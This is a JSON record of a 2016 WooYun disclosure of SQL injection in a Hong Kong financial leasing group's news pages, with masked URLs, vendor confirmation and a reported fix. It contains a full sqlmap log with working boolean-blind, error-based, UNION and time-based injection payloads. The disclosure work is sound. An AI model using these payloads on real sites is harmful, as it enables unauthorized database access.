{"id": 74611, "wybug_id": "wooyun-2016-0175048", "wybug_title": "中國金融租賃集團主站多處SQL註入打包提交（香港地區）", "wybug_corp": "中國金融租賃集團", "wybug_author": "路人甲", "wybug_date": "2016-02-16 09:44", "wybug_open_date": "2016-02-17 14:42", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "\t\t\t\t\t\t\t\t已交由第三方合作机构(hkcert香港互联网应急协调中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-02-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-02-17：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-02-17：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 中國金融租賃集團主站多處SQL註入打包提交 详细说明：  【注入点】：http://**.**.**.**/c/industry_news_details.php?itemid=479&page=1 http://www.**.**.**.**/c/corp_news_details.php?itemid=455&page=01 http://**.**.**.**/s/corp_news_details.php?itemid=455&page=01 他們存在於不同文件，有的是子目錄不同，所以是不同註入【手工测试】修改語句為：http://**.**.**.**/s/corp_news_details.php?itemid=455%27&page=01報錯信息，且泄露了路徑\n\n【sqlmap截图】數據庫信息：\n\n【乌云查重】查了下廠商名稱，只發現了http://**.**.**.**/bugs/wooyun-2010-0163764但是我和他的文件並不壹樣   漏洞证明：  sqlmap全过程：\n[10:07:16] [INFO] testing connection to the target URL[10:07:17] [INFO] testing if the target URL is stable. This can take a couple of seconds[10:07:18] [INFO] target URL is stable[10:07:18] [INFO] testing if GET parameter 'itemid' is dynamic[10:07:18] [INFO] confirming that GET parameter 'itemid' is dynamic[10:07:18] [INFO] GET parameter 'itemid' is dynamic[10:07:19] [INFO] heuristic (basic) test shows that GET parameter 'itemid' might be injectable (possible DBMS: 'MySQL')[10:07:19] [INFO] testing for SQL injection on GET parameter 'itemid'heuristic (parsing) test showed that the back-end DBMS could be 'MySQL'. Do youwant to skip test payloads specific for other DBMSes? [Y/n]do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n][10:07:21] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[10:07:21] [WARNING] reflective value(s) found and filtering out[10:07:22] [INFO] GET parameter 'itemid' seems to be 'AND boolean-based blind -WHERE or HAVING clause' injectable[10:07:22] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'[10:07:22] [INFO] GET parameter 'itemid' is 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause' injectable[10:07:22] [INFO] testing 'MySQL inline queries'[10:07:23] [INFO] testing 'MySQL > 5.0.11 stacked queries'[10:07:23] [WARNING] time-based comparison requires larger statistical model, please wait..................[10:07:26] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'[10:07:26] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'[10:07:37] [INFO] GET parameter 'itemid' seems to be 'MySQL > 5.0.11 AND time-based blind' injectable[10:07:37] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'[10:07:37] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found[10:07:37] [INFO] ORDER BY technique seems to be usable. This should reduce thetime needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test[10:07:38] [INFO] target URL appears to have 5 columns in query[10:07:40] [INFO] GET parameter 'itemid' is 'MySQL UNION query (NULL) - 1 to 20columns' injectableGET parameter 'itemid' is vulnerable. Do you want to keep testing the others (if any)? [y/N]sqlmap identified the following injection points with a total of 40 HTTP(s) requests:---Parameter: itemid (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: itemid=455 AND 2922=2922&page=01    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: itemid=455 AND (SELECT 1959 FROM(SELECT COUNT(*),CONCAT(0x71627a7671,(SELECT (CASE WHEN (1959=1959) THEN 1 ELSE 0 END)),0x716a627171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)&page=01    Type: UNION query    Title: MySQL UNION query (NULL) - 5 columns    Payload: itemid=455 UNION ALL SELECT NULL,NULL,CONCAT(0x71627a7671,0x477a427148656c74436d,0x716a627171),NULL,NULL#&page=01    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: itemid=455 AND SLEEP(5)&page=01---[10:07:44] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.3.29, Apache 2back-end DBMS: MySQL 5.0\n   修复方案：  PS：请问审核，以后提交香港台湾的漏洞，需不需要都转换为繁体字，还是简体字就可以？   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2016-02-17 12:38 厂商回复： 已將事件通知有關機構 最新状态： 2016-02-17：相關機構回報已修復漏洞  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}